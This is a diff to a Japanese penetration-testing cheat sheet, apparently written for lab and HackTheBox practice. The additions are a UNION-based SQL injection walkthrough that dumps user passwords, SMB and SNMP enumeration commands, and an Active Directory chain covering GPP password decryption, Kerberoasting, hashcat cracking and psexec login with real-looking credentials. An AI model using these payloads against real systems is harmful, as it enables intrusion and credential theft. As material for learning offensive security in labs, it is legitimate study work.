@@ -582,10 +582,66 @@ admin'/*
 ' or 1=1#
 ' or 1=1/*
 ') or ('1'='1--
-'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
 ```
-#### UNION injection
-[]
+#### UNION Injection
+コメントアウトには「-- 」or「#」を使用する。  
+1.UNION攻撃に必要な列数の決定
+```
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+# 実際の列数を超えると以下のエラーが返される
+The ORDER BY position number 3 is out of range of the number of items in the select list.
+```
+```
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# nullの数が列の数と一致しない場合、以下のエラーが返される
+All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
+```
+
+2.UNION攻撃で有用なデータ型の列を見つける
+```
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+# 型が一致しない場合、以下のエラーが返される
+　エラーが返されない場合、その列で文字列が取得可能なことが分かる
+Conversion failed when converting the varchar value 'a' to data type int.
+```
+
+3.DBのバージョン取得
+```
+' union select version(),null,null,null #
+```
+
+4.DB名の取得
+```
+' UNION SELECT DATABASE(),NULL,NULL,NULL#
+
+```
+
+5.テーブルの取得
+```
+' union select table_name,null from information_schema.tables 
+' union select table_name,null from information_schema.tables where table_schema = '<4で判明したDB名>'#
+```
+6.テーブルのカラムを参照
+```
+' union select table_name,column_name from information_schema.columns #
+' union select table_name,column_name from information_schema.columns where table_schema = '<4で判明したDB名>'#
+```
+7.データの取得
+```
+' union select user,password from <DB名>.<テーブル名> #
+' union select user,password from dvwa.users #
+```
+
 
 #### SQLインジェクション→reverse shell
 SQLmap:
@@ -1144,6 +1200,11 @@ smbmap -H 10.10.10.1
 smbmap -u <user> -p <password> -H 10.10.10.1
 smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
 ```
+```
+# 再帰的に共有フォルダを列挙
+smbmap -R <共有フォルダ> -H 10.10.10.1
+smbmap -R Replication -H 10.10.10.1
+```
 
 ### smbコマンド
 |  コマンド  |  説明  |
@@ -1221,6 +1282,9 @@ MIBはネットワーク管理に関連する情報を含むデータベース�
 ```
 kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
 ```
+```
+snmp-check 192.168.124.42
+```
 
 ### Windows SNMPの列挙
 #### MIBツリーの列挙
@@ -1236,7 +1300,20 @@ iso.3.6.1.2.1.1.4.0 = ""
 - -v...SNMPバージョン番号の指定
 - -t...タイムアウト期間の設定
 
-#### Windowsユーザーの列挙
+#### MIBの値
+この値を指定してやることでさまざまな情報を列挙可能。
+```
+1.3.6.1.2.1.25.1.6.0 (System Processes)
+1.3.6.1.2.1.25.4.2.1.2 (Running Programs)
+1.3.6.1.2.1.25.4.2.1.4 (Processes Path)
+1.3.6.1.2.1.25.2.3.1.4 (Storage Units)
+1.3.6.1.2.1.25.6.3.1.2 (Software Name)
+1.3.6.1.4.1.77.1.2.25 (User Accounts)
+1.3.6.1.2.1.6.13.1.3 (TCP Local Ports)
+```
+
+以下は、実際に値を設定した実行例
+#### ユーザーの列挙
 ```
 kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.4.1.77.1.2.25
 iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
@@ -1244,7 +1321,7 @@ iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
 iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
 ```
 
-#### 実行中のWindowsプロセス列挙n
+#### 実行中のプロセス列挙
 ```
 kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2
 iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
@@ -1396,7 +1473,6 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 ```
 
 ## Redis(6379)
-接続:
 ```
 redis-cli -h 10.10.10.160
 ```
@@ -1414,7 +1490,6 @@ OK
 10.10.10.160:6379> save
 OK
 ```
-
 
 SSH:  
 "config get dir"コマンドによりredisユーザのhomeを確認できる。  
@@ -1451,6 +1526,25 @@ OK
 OK
 10.10.10.160:6379> save
 OK
+```
+
+## Active Directory()
+```
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+```
+```
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 04:06:40.351723  2022-08-09 14:22:02.669757         
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e4fb9638ec9b760940ed1a3eb8df637d$0a5228e36e281979c...
+```
+```
+/usr/share/doc/python3-impacket/examples/psexec.py 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
 ```
 
 # Exploitation
@@ -1638,7 +1732,7 @@ searchsploit <keyword>
 
 ターミナル上でコードを閲覧。
 ```
-searchsploit - searchsploit -m windows/remote/39161.py
+searchsploit -m windows/remote/39161.py
 ```
 
 ローカルにコードやテキストをダウンロード。  
@@ -1711,6 +1805,7 @@ hashcat -m 0 hash /usr/share/wordlist/rockyou.txt
 - -m 3000...LM
 - -m 7300...IPMI2
 - -m 7400...sha256crypt $5$, SHA256(Unix)
+- -m 13100...Kerberos 5, etype 23, TGS-REP
 - --user...ユーザ名も入れたハッシュをクラック(Administrator:cfdfb19f82040000f....)
 
 Hash type:
@@ -1825,7 +1920,7 @@ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
 python2 get-pip.py
 ```
 ```
-ls /home/kali/.local/bin | grep pip                                                          1 ⨯
+ls /home/kali/.local/bin | grep pip
 pip
 pip2
 pip2.7
